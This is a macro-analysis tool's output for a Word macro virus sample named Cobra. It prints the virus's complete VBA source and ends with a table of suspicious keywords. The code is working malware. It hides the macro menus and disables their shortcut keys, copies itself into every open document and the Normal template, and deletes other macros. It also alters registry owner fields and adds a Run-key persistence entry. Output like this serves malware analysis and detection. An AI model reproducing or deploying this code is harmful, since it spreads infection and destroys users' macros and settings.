olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.g-939b913ab62afb37c9fb84f40b74b7fdc0943376
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.g-939b913ab62afb37c9fb84f40b74b7fdc0943376 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra_20B.bas 
in file: Virus.MSWord.Cobra.g-939b913ab62afb37c9fb84f40b74b7fdc0943376 - OLE stream: 'Macros/VBA/Cobra_20B'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0B
Sub Infect()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
AT = Application.NormalTemplate.FullName
AD = ActiveDocument.FullName
For Each doc In Documents
OD = doc.FullName
For NC = 1 To doc.VBProject.VBComponents.Count '
MC = (1999 + 1) - 2000
If doc.VBProject.VBComponents(NC).Name <> "Reference to Normal" And _
doc.VBProject.VBComponents(NC).Name <> "ThisDocument" And _
doc.VBProject.VBComponents(NC).Name <> "Cobra_20B" Then
Application.OrganizerDelete Source:=OD, _
Name:=doc.VBProject.VBComponents(NC).Name, _
Object:=wdOrganizerObjectProjectItems
End If
If doc.VBProject.VBComponents(NC).Name = "Cobra_20B" Then
MC = (2000 + 1) - (1999 + 1)
End If
Next
If MC = (1999 + 1) - 2000 Then
Application.OrganizerCopy Source:=AD, _
Destination:=OD, Name:="Cobra_20B", _
Object:=wdOrganizerObjectProjectItems
End If
Next
MC = (1999 + 1) - 2000
For NC = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(NC).Name <> "ThisDocument" And _
NormalTemplate.VBProject.VBComponents(NC).Name <> "Cobra_20B" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=NormalTemplate.VBProject.VBComponents(NC).Name, _
Object:=wdOrganizerObjectProjectItems
End If
If NormalTemplate.VBProject.VBComponents(NC).Name = "Cobra_20B" Then
MC = (2000 + 1) - (1999 + 1)
End If
Next
If MC = (1999 + 1) - 2000 Then
Application.OrganizerCopy Source:=AD, Destination:=NormalTemplate.FullName, _
Name:="Cobra_20B", Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub IntCobra()
FDt = Format("01/01/2000", "mm/dd/yyyy")
CDt = Format(Date, "mm/dd/yyyy")
PDt = DateValue(CDt) - DateValue(FDt)
WTit = "Y2K+D" & PDt
GeWd = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra VS LITON" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra VS LITON"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,(PA12A19H2AG)/DHK/BD"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Infday") = Format(Date, "mm/dd/yyyy")
End If
Curd = Date
InfD = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Infday")
TinfD = DateValue(Curd) - DateValue(InfD)
If TinfD > 30 Then
ActiveDocument.SaveAs GeWd + "\Cobra.doc"
ActiveDocument.ActiveWindow.Caption = WTit
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Infected") <> GeWd + "\Cobra.Doc" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Infected") = GeWd + "\Cobra.Doc"
If ActiveDocument.VBProject.VBComponents("Cobra_20B").CodeModule.Lines(78, 1) <> "Application.Quit" Then
ActiveDocument.VBProject.VBComponents("Cobra_20B").CodeModule.InsertLines 78, "Application.Quit"
ActiveDocument.Save
End If
End If
End If
End Sub
Sub AutoOpen()
Call Infect
Call IntCobra
End Sub
Sub AutoClose()
Call Infect
Call IntCobra
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

